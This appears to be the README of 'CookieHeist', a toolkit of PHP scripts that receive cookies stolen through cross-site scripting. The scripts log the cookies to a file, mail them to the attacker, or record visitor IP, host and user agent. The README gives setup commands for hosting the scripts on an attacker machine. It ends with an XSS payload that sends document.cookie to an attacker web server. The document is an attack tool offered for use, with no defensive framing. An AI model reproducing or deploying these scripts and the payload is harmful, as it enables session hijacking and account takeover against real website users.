# CookieHeist
PHP Cookie Stealing Scripts for use in XSS

1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to cookielog.txt. 

2. Cookiesteal-simple-v2.php - Records whatever "c" parameter holds, writes value to cookielog.txt and redirects to Google.com.

3. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.

4. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.

## Usage
1. On the remote attacker machine, start the webserver (Apache2 in example):
sudo service apache2 start

2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine.
git clone https://github.com/RxSec/CookieHeist
cd CookieHeist
sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/
sudo scp cookielog.txt username@AttackMachine:/var/www/html/

Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie

XSS Payload Example: <script javascript:text>document.location="http://[Attacker Webserver]?c=" + document.cookie + "&t=Alert"; </script>
